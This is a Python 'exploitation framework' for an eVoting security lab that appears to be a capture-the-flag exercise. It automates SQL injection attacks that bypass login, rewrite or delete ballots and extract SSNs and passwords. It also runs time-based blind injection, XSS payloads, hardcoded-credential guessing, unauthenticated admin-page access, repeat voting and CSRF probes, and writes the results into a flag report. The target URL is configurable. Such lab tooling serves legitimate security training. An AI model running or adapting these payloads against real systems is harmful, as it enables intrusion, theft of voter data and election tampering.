#!/usr/bin/env python3
"""
eVoting Security Lab - Exploitation Framework
Educational tool for demonstrating web application vulnerabilities

WARNING: Use only in authorized lab environments!
"""

import requests
import time
import sys
from urllib.parse import quote
import json

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class eVotingExploiter:
    def __init__(self, base_url="http://localhost:8181"):
        self.base_url = base_url
        self.session = requests.Session()
        self.flags_found = []
        
    def print_banner(self):
        print(f"{Colors.HEADER}{Colors.BOLD}")
        print("=" * 60)
        print("   eVoting Security Lab - Exploitation Framework")
        print("   Educational Purpose Only - Authorized Use Required")
        print("=" * 60)
        print(f"{Colors.ENDC}")
    
    def log_flag(self, flag_id, description):
        """Log discovered flag"""
        flag_info = {
            'id': flag_id,
            'description': description,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        self.flags_found.append(flag_info)
        print(f"{Colors.OKGREEN}[+] FLAG FOUND: {flag_id}{Colors.ENDC}")
        print(f"    {description}")
    
    # ==================== SQL INJECTION TESTS ====================
    
    def test_sql_injection_login(self):
        """Test SQL injection in login form - FLAG-SQL-001"""
        print(f"\n{Colors.OKBLUE}[*] Testing SQL Injection in Login...{Colors.ENDC}")
        
        payloads = [
            ("admin' OR '1'='1", "anything", "Boolean-based blind"),
            ("admin' OR '1'='1'--", "anything", "Comment-based"),
            ("admin' OR '1'='1'#", "anything", "Hash comment"),
            ("' OR 1=1--", "", "Classic bypass"),
            ("admin' UNION SELECT 1,2,3,4,5,6,7,8,9--", "", "Union-based")
        ]
        
        for username, password, technique in payloads:
            data = {
                'Username': username,
                'Password': password,
                'submit': 'login'
            }
            
            try:
                response = self.session.post(
                    f"{self.base_url}/evoting/login1.php",
                    data=data,
                    allow_redirects=False
                )
                
                if response.status_code == 302 or "Welcome" in response.text:
                    self.log_flag("FLAG-SQL-001", 
                                f"SQL Injection successful using {technique}")
                    print(f"    Payload: {username}")
                    return True
            except Exception as e:
                print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    def test_sql_injection_voting(self):
        """Test SQL injection in voting form - FLAG-SQL-005"""
        print(f"\n{Colors.OKBLUE}[*] Testing SQL Injection in Voting...{Colors.ENDC}")
        
        payloads = [
            "'; UPDATE ballot SET President_Selection='Hacker' WHERE 1=1--",
            "'; DELETE FROM ballot WHERE 1=1--",
            "' UNION SELECT CitizenNum,Username,Password,SSN,FirstName,LastName,1,2,3 FROM person_info--"
        ]
        
        for payload in payloads:
            data = {
                'president': payload,
                'VoterId': '50001',
                'StateNum': '1',
                'submit': 'Submit'
            }
            
            try:
                response = self.session.post(
                    f"{self.base_url}/evoting/electioninfo2016.php",
                    data=data
                )
                
                if "successfully" in response.text or "Error" not in response.text:
                    self.log_flag("FLAG-SQL-005", 
                                "SQL Injection in voting system")
                    print(f"    Payload: {payload[:50]}...")
                    return True
            except Exception as e:
                print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    def test_sql_injection_delete(self):
        """Test SQL injection in delete user - FLAG-SQL-006"""
        print(f"\n{Colors.OKBLUE}[*] Testing SQL Injection in User Deletion...{Colors.ENDC}")
        
        # Extract data before deletion
        data = {
            'CitizenNum': "1 UNION SELECT Username,Password,SSN,1 FROM person_info--",
            'vID': '1',
            'vName': 'test',
            'submit': '1'
        }
        
        try:
            response = self.session.post(
                f"{self.base_url}/evoting/DeleteUser.php",
                data=data
            )
            
            if "Successfully Deleted" in response.text or "Query" in response.text:
                self.log_flag("FLAG-SQL-006 to FLAG-SQL-011", 
                            "Multiple SQL injection points in deletion")
                return True
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    def test_blind_sql_injection(self):
        """Test blind SQL injection using timing attacks - FLAG-ADV-002"""
        print(f"\n{Colors.OKBLUE}[*] Testing Blind SQL Injection (Timing)...{Colors.ENDC}")
        
        # Time-based blind SQL injection
        data = {
            'VoterId': '50001',
            'StateNum': "1' AND (SELECT SLEEP(5))--",
            'president': 'D. Trump',
            'submit': 'Submit'
        }
        
        try:
            start_time = time.time()
            response = self.session.post(
                f"{self.base_url}/evoting/electioninfo2016.php",
                data=data,
                timeout=10
            )
            elapsed = time.time() - start_time
            
            if elapsed > 4:  # Should take ~5 seconds
                self.log_flag("FLAG-ADV-002", 
                            f"Blind SQL injection confirmed (delay: {elapsed:.2f}s)")
                return True
        except requests.exceptions.Timeout:
            self.log_flag("FLAG-ADV-002", 
                        "Blind SQL injection confirmed (timeout)")
            return True
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    # ==================== XSS TESTS ====================
    
    def test_reflected_xss(self):
        """Test reflected XSS vulnerabilities - FLAG-XSS-001"""
        print(f"\n{Colors.OKBLUE}[*] Testing Reflected XSS...{Colors.ENDC}")
        
        payloads = [
            "<script>alert('FLAG-XSS-001')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        # Test in login form
        for payload in payloads:
            data = {
                'Username': payload,
                'Password': 'test',
                'submit': 'login'
            }
            
            try:
                response = self.session.post(
                    f"{self.base_url}/evoting/login1.php",
                    data=data
                )
                
                if payload in response.text and "<script>" not in response.text.replace(payload, ""):
                    self.log_flag("FLAG-XSS-001", 
                                "Reflected XSS in login error message")
                    print(f"    Payload: {payload}")
                    return True
            except Exception as e:
                print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    def test_stored_xss(self):
        """Test stored XSS in candidate descriptions - FLAG-XSS-002"""
        print(f"\n{Colors.OKBLUE}[*] Testing Stored XSS...{Colors.ENDC}")
        
        # This would require admin access to add candidates
        # Check if existing data contains XSS
        try:
            response = self.session.get(
                f"{self.base_url}/evoting/electioninfo2016.php"
            )
            
            xss_patterns = ["<script>", "onerror=", "onload="]
            for pattern in xss_patterns:
                if pattern in response.text:
                    self.log_flag("FLAG-XSS-002", 
                                "Stored XSS found in candidate data")
                    return True
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    # ==================== AUTHENTICATION TESTS ====================
    
    def test_hardcoded_credentials(self):
        """Test hardcoded admin credentials - FLAG-AUTH-001"""
        print(f"\n{Colors.OKBLUE}[*] Testing Hardcoded Credentials...{Colors.ENDC}")
        
        credentials = [
            ("Admin187", "password187"),
            ("backdoor", "secret123"),
            ("admin", "admin"),
            ("root", "root")
        ]
        
        for username, password in credentials:
            data = {
                'Username': username,
                'Password': password,
                'submit': 'login'
            }
            
            try:
                response = self.session.post(
                    f"{self.base_url}/evoting/login1.php",
                    data=data,
                    allow_redirects=False
                )
                
                if response.status_code == 302 or "Welcome Admin" in response.text:
                    self.log_flag("FLAG-AUTH-001", 
                                f"Hardcoded credentials found: {username}:{password}")
                    return True
            except Exception as e:
                print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    def test_broken_access_control(self):
        """Test broken access control - FLAG-BAC-001"""
        print(f"\n{Colors.OKBLUE}[*] Testing Broken Access Control...{Colors.ENDC}")
        
        protected_pages = [
            "/evoting/AdminCode.php",
            "/evoting/AdminCodeStuff.php",
            "/evoting/DeleteUser.php",
            "/evoting/AddNewCandidate.php"
        ]
        
        for page in protected_pages:
            try:
                # Try accessing without authentication
                response = self.session.get(f"{self.base_url}{page}")
                
                if response.status_code == 200 and "login" not in response.text.lower():
                    self.log_flag("FLAG-BAC-001", 
                                f"Direct access to admin page: {page}")
                    return True
            except Exception as e:
                print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    def test_multiple_voting(self):
        """Test ability to vote multiple times - FLAG-BAC-002"""
        print(f"\n{Colors.OKBLUE}[*] Testing Multiple Voting Prevention...{Colors.ENDC}")
        
        data = {
            'president': 'D. Trump',
            'VoterId': '50001',
            'StateNum': '1',
            'submit': 'Submit'
        }
        
        try:
            # Try voting twice
            response1 = self.session.post(
                f"{self.base_url}/evoting/electioninfo2016.php",
                data=data
            )
            
            response2 = self.session.post(
                f"{self.base_url}/evoting/electioninfo2016.php",
                data=data
            )
            
            if "successfully" in response2.text.lower():
                self.log_flag("FLAG-BAC-002", 
                            "Multiple voting possible - no prevention mechanism")
                return True
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    # ==================== CSRF TESTS ====================
    
    def test_csrf_voting(self):
        """Test CSRF in voting - FLAG-CSRF-001"""
        print(f"\n{Colors.OKBLUE}[*] Testing CSRF in Voting Form...{Colors.ENDC}")
        
        # Check if CSRF token exists
        try:
            response = self.session.get(
                f"{self.base_url}/evoting/electioninfo2016.php"
            )
            
            if "csrf" not in response.text.lower() and "token" not in response.text.lower():
                self.log_flag("FLAG-CSRF-001", 
                            "No CSRF protection on voting form")
                print("    Malicious page can submit votes on behalf of users")
                return True
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error: {e}{Colors.ENDC}")
        
        return False
    
    # ==================== INFORMATION DISCLOSURE ====================
    
    def test_information_disclosure(self):
        """Test for exposed sensitive information - FLAG-CONFIG-002"""
        print(f"\n{Colors.OKBLUE}[*] Testing Information Disclosure...{Colors.ENDC}")
        
        pages = [
            "/evoting/login1.php",
            "/evoting/connect.php",
            "/evoting/config.php"
        ]
        
        for page in pages:
            try:
                response = self.session.get(f"{self.base_url}{page}")
                
                patterns = [
                    ("password", "FLAG-CONFIG-001"),
                    ("<!-- Debug", "FLAG-CONFIG-002"),
                    ("mysql_error", "FLAG-CONFIG-002"),
                    ("Query:", "FLAG-CONFIG-002"),
                    ("SSN:", "FLAG-DATA-003")
                ]
                
                for pattern, flag in patterns:
                    if pattern in response.text:
                        self.log_flag(flag, 
                                    f"Information disclosure in {page}: {pattern}")
            except Exception as e:
                pass
        
        return True
    
    # ==================== REPORT GENERATION ====================
    
    def generate_report(self):
        """Generate vulnerability assessment report"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}")
        print("=" * 60)
        print("   VULNERABILITY ASSESSMENT REPORT")
        print("=" * 60)
        print(f"{Colors.ENDC}")
        
        print(f"\n{Colors.OKGREEN}Total Flags Found: {len(self.flags_found)}{Colors.ENDC}\n")
        
        for i, flag in enumerate(self.flags_found, 1):
            print(f"{i}. {flag['id']}")
            print(f"   Description: {flag['description']}")
            print(f"   Discovered: {flag['timestamp']}\n")
        
        # Save to file
        with open('vulnerability_report.json', 'w') as f:
            json.dump(self.flags_found, f, indent=4)
        
        print(f"{Colors.OKGREEN}[+] Report saved to vulnerability_report.json{Colors.ENDC}")
    
    # ==================== MAIN EXECUTION ====================
    
    def run_all_tests(self):
        """Run all exploitation tests"""
        self.print_banner()
        
        print(f"\n{Colors.WARNING}[!] Starting automated exploitation tests...{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Ensure you have authorization to test this system!{Colors.ENDC}\n")
        
        time.sleep(2)
        
        # Run all test categories
        self.test_hardcoded_credentials()
        self.test_sql_injection_login()
        self.test_sql_injection_voting()
        self.test_sql_injection_delete()
        self.test_blind_sql_injection()
        self.test_reflected_xss()
        self.test_stored_xss()
        self.test_broken_access_control()
        self.test_multiple_voting()
        self.test_csrf_voting()
        self.test_information_disclosure()
        
        # Generate report
        self.generate_report()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:8181"
    
    exploiter = eVotingExploiter(base_url)
    
    try:
        exploiter.run_all_tests()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Testing interrupted by user{Colors.ENDC}")
        exploiter.generate_report()
    except Exception as e:
        print(f"\n{Colors.FAIL}[-] Error during testing: {e}{Colors.ENDC}")

print(f"\n{Colors.OKBLUE}[*] Testing complete!{Colors.ENDC}")
print(f"{Colors.WARNING}[!] Remember: Use these techniques only in authorized environments{Colors.ENDC}\n")
